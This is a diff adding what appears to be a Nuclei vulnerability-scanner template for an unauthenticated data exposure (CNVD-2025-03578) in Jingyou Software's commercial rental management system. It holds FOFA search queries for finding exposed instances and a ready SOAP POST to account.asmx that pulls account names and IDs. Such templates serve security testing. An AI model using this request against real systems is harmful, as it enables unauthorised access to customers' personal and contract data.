@@ -1,0 +1,44 @@
+id: jingyou-shangyezulin-Information-disclosure-CNVD-2025-03578
+
+info:
+  name: "竞优软件商业租赁管理系统account.asmx敏感数据暴露"
+  author: Unknown
+  severity: medium
+  description: |-
+    fofa: title="商业租赁管理系统" || body="Silverlight/install/Silverlight5.exe" || body="pageUrl = "/loading.aspx"" || body="竞优软件</a>"
+      竞优软件商业租赁管理系统因权限校验机制缺失，导致系统内部敏感数据可被未授权访问。攻击者通过特定路径访问可获取租赁合同、客户信息等结构化数据，此类数据泄露可能引发数据合规性风险及潜在法律纠纷。
+  reference:
+  - https://mp.weixin.qq.com/s/dcBZcg8XkeZoCwoffE1vAA
+  tags: 竞优软件
+
+http:
+- raw:
+  - |
+    POST /rental/contract/api/account.asmx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetAccountInfo
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope 
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
+        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+            <GetAccountInfo xmlns="http://tempuri.org/" />
+        </soap:Body>
+    </soap:Envelope>  
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"Name":"'
+    - '"Accountid":'
+    - '"Iscompany":"'
+    condition: and
+  - type: status
+    status:
+    - 200
